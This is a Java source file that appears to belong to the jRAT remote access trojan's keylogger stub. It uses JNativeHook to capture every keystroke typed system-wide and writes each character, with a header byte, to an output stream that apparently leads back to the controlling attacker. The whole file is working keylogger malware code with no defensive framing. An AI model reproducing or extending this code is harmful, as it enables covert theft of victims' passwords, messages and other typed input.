package org.jrat.project.stub.keylogger;

import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class Keylogger implements NativeKeyListener {

	@Override
	public void nativeKeyPressed(NativeKeyEvent arg0) {
		
	}

	@Override
	public void nativeKeyReleased(NativeKeyEvent arg0) {

	}

	@Override
	public void nativeKeyTyped(NativeKeyEvent arg0) {		
		try {
			if (Plugin.dos != null && Plugin.enabled) {
				Plugin.dos.writeByte(Plugin.KEY_HEADER);
				
				Plugin.writeChars(new char[] { arg0.getKeyChar() });
			}
		} catch (Exception e) {
			System.err.println("Error: " + e.getClass().getSimpleName() + ": " + e.getMessage());
		}

	}

}
